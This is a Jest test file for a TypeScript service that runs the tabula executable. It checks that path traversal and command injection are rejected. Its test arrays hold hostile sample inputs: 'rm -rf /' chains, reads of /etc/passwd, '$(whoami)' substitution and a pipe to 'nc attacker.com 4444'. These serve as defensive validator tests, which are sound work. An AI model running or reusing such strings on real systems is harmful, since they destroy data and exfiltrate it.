import { executeTabula, checkTabulaAvailable } from '../../services/process-service';
import * as child_process from 'child_process';

// Mock child_process
jest.mock('child_process');
const mockedChildProcess = child_process as jest.Mocked<typeof child_process>;

// Mock Notice from setup
const mockNotice = (global as any).Notice;

describe('Process Service', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('executeTabula', () => {
    it('should execute tabula successfully', async () => {
      // Mock successful execFile
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'success output', ''), 0);
        return {} as any;
      }) as any);

      const result = await executeTabula('tabula', '/test/path/file.csv');

      expect(result.success).toBe(true);
      expect(result.stdout).toBe('success output');
      expect(mockedChildProcess.execFile).toHaveBeenCalledWith(
        'tabula',
        ['-a', '-u', '/test/path/file.csv'],
        expect.objectContaining({
          timeout: 30000,
          maxBuffer: 1024 * 1024,
          env: expect.objectContaining({
            PATH: process.env.PATH,
            HOME: process.env.HOME
          })
        }),
        expect.any(Function)
      );
    });

    it('should handle process execution error', async () => {
      const error = new Error('Process failed');
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(error, null, 'stderr output'), 0);
        return {} as any;
      }) as any);

      const result = await executeTabula('tabula', '/test/path/file.csv');

      expect(result.success).toBe(false);
      expect(result.error).toContain('Process failed');
      expect(result.stderr).toBe('stderr output');
    });

    it('should sanitize file path', async () => {
      const maliciousPath = '/test/../../../etc/passwd';
      
      const result = await executeTabula('tabula', maliciousPath, false);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Security validation failed');
    });

    it('should validate executable name', async () => {
      const result = await executeTabula('rm -rf /', '/test/path/file.csv', false);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Executable name contains invalid characters');
    });

    it('should handle empty executable name', async () => {
      const result = await executeTabula('', '/test/path/file.csv', false);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid executable name');
    });

    it('should handle invalid file path', async () => {
      const result = await executeTabula('tabula', '', false);
      
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid file path provided');
    });

    it('should show notices when enabled', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'output', ''), 0);
        return {} as any;
      }) as any);

      await executeTabula('tabula', '/test/path/file.csv', true);

      expect(mockNotice).toHaveBeenCalledWith('Executing tabula...');
      expect(mockNotice).toHaveBeenCalledWith('Tabula execution completed');
    });

    it('should not show notices when disabled', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'output', ''), 0);
        return {} as any;
      }) as any);

      await executeTabula('tabula', '/test/path/file.csv', false);

      expect(mockNotice).not.toHaveBeenCalled();
    });

    it('should handle stderr output', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'stdout', 'stderr warning'), 0);
        return {} as any;
      }) as any);

      const result = await executeTabula('tabula', '/test/path/file.csv', true);

      expect(result.success).toBe(true);
      expect(result.stderr).toBe('stderr warning');
      expect(mockNotice).toHaveBeenCalledWith('Tabula stderr: stderr warning');
    });

    it('should handle process error event', async () => {
      const mockChild = {
        on: jest.fn()
      };

      mockedChildProcess.execFile.mockImplementation((() => {
        return mockChild;
      }) as any);

      // Simulate error event
      mockChild.on.mockImplementation((event: string, callback: Function) => {
        if (event === 'error') {
          setTimeout(() => callback(new Error('Process error')), 0);
        }
      });

      const result = await executeTabula('tabula', '/test/path/file.csv', false);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Process error');
    });

    it('should respect timeout configuration', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'output', ''), 0);
        return {} as any;
      }) as any);

      await executeTabula('tabula', '/test/path/file.csv');

      expect(mockedChildProcess.execFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({
          timeout: 30000,
          maxBuffer: 1024 * 1024
        }),
        expect.any(Function)
      );
    });

    it('should validate executable with alphanumeric characters', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'output', ''), 0);
        return {} as any;
      }) as any);

      const validExecutables = ['tabula', 'tabula-dev', 'tabula_v2', 'tabula.exe'];
      
      for (const executable of validExecutables) {
        const result = await executeTabula(executable, '/test/file.csv', false);
        expect(result.success).toBe(true);
      }
    });

    it('should reject executable with invalid characters', async () => {
      const invalidExecutables = [
        'tabula && rm -rf /',
        'tabula; ls',
        'tabula | cat',
        'tabula > /dev/null',
        'tabula$(whoami)'
      ];

      for (const executable of invalidExecutables) {
        const result = await executeTabula(executable, '/test/file.csv', false);
        expect(result.success).toBe(false);
        expect(result.error).toContain('invalid characters');
      }
    });
  });

  describe('checkTabulaAvailable', () => {
    it('should return true when tabula is available', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'tabula v1.0.0', ''), 0);
        return {} as any;
      }) as any);

      const result = await checkTabulaAvailable('tabula');

      expect(result).toBe(true);
      expect(mockedChildProcess.execFile).toHaveBeenCalledWith(
        'tabula',
        ['--version'],
        { timeout: 5000 },
        expect.any(Function)
      );
    });

    it('should return false when tabula is not available', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(new Error('Command not found'), '', ''), 0);
        return {} as any;
      }) as any);

      const result = await checkTabulaAvailable('tabula');

      expect(result).toBe(false);
    });

    it('should return false for invalid executable name', async () => {
      const result = await checkTabulaAvailable('invalid; command');

      expect(result).toBe(false);
      expect(mockedChildProcess.execFile).not.toHaveBeenCalled();
    });

    it('should handle timeout properly', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'tabula v1.0.0', ''), 0);
        return {} as any;
      }) as any);

      await checkTabulaAvailable('tabula');

      expect(mockedChildProcess.execFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({ timeout: 5000 }),
        expect.any(Function)
      );
    });
  });

  describe('Security tests', () => {
    it('should prevent path traversal attacks', async () => {
      const maliciousPaths = [
        '/test/../../../etc/passwd',
        '/test/./../../etc/passwd',
        '~/../../etc/passwd',
        '/test/~/../etc/passwd'
      ];

      for (const path of maliciousPaths) {
        const result = await executeTabula('tabula', path, false);
        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
      }
    });

    it('should sanitize environment variables', async () => {
      mockedChildProcess.execFile.mockImplementation(((
        command: string, 
        args: string[], 
        options: any, 
        callback: Function
      ) => {
        setTimeout(() => callback(null, 'output', ''), 0);
        return {} as any;
      }) as any);

      await executeTabula('tabula', '/test/file.csv', false);

      expect(mockedChildProcess.execFile).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(Array),
        expect.objectContaining({
          env: expect.objectContaining({
            PATH: expect.any(String),
            HOME: expect.any(String)
          })
        }),
        expect.any(Function)
      );

      // Verify only specific env vars are passed
      const call = mockedChildProcess.execFile.mock.calls[0];
      const options = call[2] as any;
      const envKeys = Object.keys(options.env);
      expect(envKeys).toHaveLength(2);
      expect(envKeys).toContain('PATH');
      expect(envKeys).toContain('HOME');
    });

    it('should prevent command injection through file paths', async () => {
      const maliciousFileNames = [
        '/test/file.csv; rm -rf /',
        '/test/file.csv && echo pwned',
        '/test/file.csv | nc attacker.com 4444',
        '/test/file.csv > /dev/null; malicious_command'
      ];

      for (const fileName of maliciousFileNames) {
        const result = await executeTabula('tabula', fileName, false);
        
        // The path sanitization should catch these
        expect(result.success).toBe(false);
        expect(result.error).toContain('Security validation failed');
      }
    });
  });
});